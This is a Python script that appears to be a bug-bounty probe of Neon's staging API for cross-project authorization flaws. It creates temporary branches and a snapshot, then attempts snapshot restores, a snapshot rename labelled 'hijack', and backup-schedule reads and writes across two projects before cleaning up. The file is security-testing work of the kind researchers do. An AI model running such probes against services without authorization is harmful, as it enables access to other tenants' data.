# -*- coding: utf-8 -*-
"""Neon staging S2: snapshot/restore two-step state machine + cross-project refs.
Zero-destruction: all destructive ops target freshly created temp branches.
Stages:
 0 prepare temp branches (PA: brA_tmp, PB: brB_tmp)
 1 create snapshot sidA from brA_tmp
 2 PA-internal restore (no target) -> observe two-step state machine
 3 cross-project restore: H1b (target=brB_tmp) / H1a (path project=PB, sidA)
 4 cross-project PATCH snapshot (path PB + sidA)
 5 backup_schedule cross-project GET/PUT (on temp branches only)
 6 cleanup: delete temp branches + sidA
"""
import json
import time
import ssl
import http.client
import uuid

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo", "Content-Type": "application/json"}
PA = "orange-sun-90493739"          # project A (sec-i-1)
PAMAIN = "br-wandering-field-w2ob6mpn"
PB = "damp-term-63384673"           # project B (clean target)
PBMAIN = "br-raspy-band-w247957z"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]

OUT = []
TAG = "s2" + uuid.uuid4().hex[:4]
LOG = r"F:\scan\neon_report\_s2_out.jsonl"


def log(key, st, out, note=""):
    rec = {"t": time.strftime("%H:%M:%S"), "key": key, "st": st, "note": note,
           "body": out[:1500]}
    OUT.append(rec)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    print("[%s] %-46s -> %s %s" % (rec["t"], key, st, note))
    if st >= 400:
        try:
            e = json.loads(out)
            print("        code=%s msg=%s" % (e.get("code"), e.get("message", "")[:200]))
        except Exception:
            print("        raw:", out[:200])


def call(method, path, body=None, timeout=30):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    conn.request(method, API_BASE + path, body=payload,
                 headers=dict(HB, Authorization="Bearer " + APIKEY))
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def wait_branch(pid, bid, want="ready", tries=24, gap=3):
    for _ in range(tries):
        st, out = call("GET", "/projects/%s/branches/%s" % (pid, bid))
        if st == 200:
            b = json.loads(out).get("branch", {})
            ps = b.get("pending_state")
            cs = b.get("current_state")
            if ps == want or (cs == want and ps is None):
                return True, b
        time.sleep(gap)
    return False, out


def main():
    # ---------- stage 0: temp branches ----------
    st, out = call("POST", "/projects/%s/branches" % PA,
                   {"branch": {"name": "s2-%s-a" % TAG, "parent_id": PAMAIN}})
    log("st0 create brA_tmp", st, out)
    brA = json.loads(out).get("branch", {}).get("id") if st == 200 else None
    if not brA:
        return
    st, out = call("POST", "/projects/%s/branches" % PB,
                   {"branch": {"name": "s2-%s-b" % TAG, "parent_id": PBMAIN}})
    log("st0 create brB_tmp", st, out)
    brB = json.loads(out).get("branch", {}).get("id") if st == 200 else None
    if not brB:
        return
    ok, _ = wait_branch(PA, brA)
    log("st0 brA_tmp ready", 200 if ok else 500, json.dumps(_)[:600] if not ok else "")
    ok, _ = wait_branch(PB, brB)
    log("st0 brB_tmp ready", 200 if ok else 500, json.dumps(_)[:600] if not ok else "")

    # ---------- stage 1: snapshot sidA from brA_tmp ----------
    st, out = call("POST", "/projects/%s/branches/%s/snapshot?name=s2-%s-sid"
                   % (PA, brA, TAG))
    log("st1 create sidA", st, out)
    sidA = None
    if st == 200:
        sidA = json.loads(out).get("snapshot", {}).get("id")
        # wait until visible in project snapshot list
        for _ in range(15):
            st2, out2 = call("GET", "/projects/%s/snapshots" % PA)
            snaps = json.loads(out2).get("snapshots", []) if st2 == 200 else []
            hit = [s for s in snaps if s.get("id") == sidA]
            if hit:
                log("st1 sidA listed", st2, out2[:200], "status=%s" % hit[0].get("status"))
                break
            time.sleep(2)
    else:
        log("st1 sidA FAILED", st, out)
        return
    if not sidA:
        return

    # ---------- stage 2: PA-internal restore, observe state machine ----------
    time.sleep(2)
    st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PA, sidA), {})
    log("st2 restore(no target)", st, out)
    brX = None
    if st == 200:
        b = json.loads(out).get("branch", {})
        brX = b.get("id")
        log("st2 restore branch fields", 200, out,
            "id=%s restore_status=%s restored_from=%s restored_as=%s" % (
                b.get("id"), b.get("restore_status"), b.get("restored_from"),
                b.get("restored_as")))
    # window observation: is source branch brA_tmp locked/renamed meanwhile?
    st, out = call("GET", "/projects/%s/branches/%s" % (PA, brA))
    if st == 200:
        b = json.loads(out).get("branch", {})
        log("st2 window: source branch state", st, out[:300],
            "name=%s state=%s/%s restore_status=%s" % (
                b.get("name"), b.get("current_state"), b.get("pending_state"),
                b.get("restore_status")))
    if brX:
        ok, b = wait_branch(PA, brX, want="ready", tries=20, gap=3)
        log("st2 window: restored branch ready", 200 if ok else 500,
            json.dumps(b)[:800] if not ok else "",
            "restore_status=%s" % b.get("restore_status") if ok else "")

    # ---------- stage 3: cross-project restore ----------
    # H1b: PA path + own sidA, but target = PB's temp branch
    st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PA, sidA),
                   {"target_branch_id": brB})
    log("st3 H1b cross-proj target=brB", st, out)
    # H1a: PB path + PA's sidA (snapshot not in this project)
    st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PB, sidA), {})
    log("st3 H1a cross-proj path(PB)/sidA", st, out)
    # H1a': both wrong
    st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PB, sidA),
                   {"target_branch_id": brB})
    log("st3 H1a' cross-proj full", st, out)

    # ---------- stage 4: cross-project PATCH snapshot ----------
    st, out = call("PATCH", "/projects/%s/snapshots/%s" % (PB, sidA),
                   {"snapshot": {"name": "s2-hijack-%s" % TAG}})
    log("st4 H3a PATCH snap path(PB)/sidA", st, out)
    # verify: did sidA name change?
    st, out = call("GET", "/projects/%s/snapshots" % PA)
    if st == 200:
        snaps = json.loads(out).get("snapshots", [])
        hit = [s for s in snaps if s.get("id") == sidA]
        log("st4 verify sidA name", st, out[:300],
            "name=%s" % hit[0].get("name") if hit else "sidA GONE")

    # ---------- stage 5: backup_schedule ----------
    st, out = call("GET", "/projects/%s/branches/%s/backup_schedule" % (PA, brB))
    log("st5 GET schedule path(PA)/brB", st, out)
    st, out = call("GET", "/projects/%s/branches/%s/backup_schedule" % (PB, brA))
    log("st5 GET schedule path(PB)/brA", st, out)
    st, out = call("GET", "/projects/%s/branches/%s/backup_schedule" % (PA, brA))
    log("st5 GET schedule baseline", st, out)
    st, out = call("PUT", "/projects/%s/branches/%s/backup_schedule" % (PA, brB),
                   {"schedule": [{"frequency": "daily", "retention_seconds": 604800}]})
    log("st5 PUT schedule path(PA)/brB cross-proj", st, out)
    st, out = call("PUT", "/projects/%s/branches/%s/backup_schedule" % (PA, brA),
                   {"schedule": [{"frequency": "weekly"}]})
    log("st5 PUT schedule own temp brA", st, out)

    # ---------- stage 6: cleanup ----------
    for pid, bid, tag in ((PA, brX, "brX"), (PB, brB, "brB_tmp"), (PA, brA, "brA_tmp")):
        if not bid:
            continue
        st, out = call("DELETE", "/projects/%s/branches/%s" % (pid, bid))
        log("st6 cleanup delete %s" % tag, st, out)
        time.sleep(2)
    if sidA:
        st, out = call("DELETE", "/projects/%s/snapshots/%s" % (PA, sidA))
        log("st6 cleanup delete sidA", st, out)

    # summary
    print("\n==== SUMMARY ====")
    for r in OUT:
        mark = "!!" if r["st"] not in (200, 201, 202, 204, 404, 400, 403, 409) else "  "
        print("%s %s %-46s -> %s %s" % (mark, r["t"], r["key"], r["st"], r["note"]))


if __name__ == "__main__":
    main()
